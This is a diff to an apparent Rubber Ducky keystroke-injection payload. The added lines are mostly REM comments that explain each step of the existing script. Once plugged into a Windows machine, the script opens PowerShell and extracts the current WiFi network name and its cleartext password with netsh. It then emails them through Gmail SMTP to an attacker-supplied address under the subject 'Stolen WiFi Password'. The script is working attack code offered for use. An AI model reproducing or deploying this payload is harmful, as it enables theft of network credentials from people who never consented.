@@ -1,12 +1,17 @@
 DELAY 10000
+REM Windows may open the device in file explorer once it's plugged in depending on the setting
+REM I will send a ctrl+w to try to close the top-level window first then proceed
 CONTROL w
 DELAY 1000
 WINDOWS r
 DELAY 500
+
+REM open powershell window
 STRING powershell
 ENTER
 DELAY 1000
 
+REM Enter your gmail and password here.
 STRING $from_email="<from_email>"
 ENTER
 STRING $to_email="<to_email>"
@@ -14,10 +19,13 @@ ENTER
 STRING $email_pass="<password>"
 ENTER
 
+REM get current wifi ssid and wifi password
 STRING $_, $ssid = ((netsh wlan show interface | findstr "Profile" | findstr /v "mode") -split ":",2).trim()
 ENTER
 STRING $_, $pass = ((netsh wlan show profile name=$ssid key=clear | findstr Key) -split ":").trim()
 ENTER
+
+REM Construct Email
 STRING $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
@@ -34,6 +42,8 @@ STRING $email.Subject = 'Stolen WiFi Password'
 ENTER
 STRING $email.Body = "SSID: $ssid`r`nPassword: $pass"
 ENTER
+
+REM Send Email
 STRING $SMTPInfo.Send("$email")
 ENTER
 STRING exit
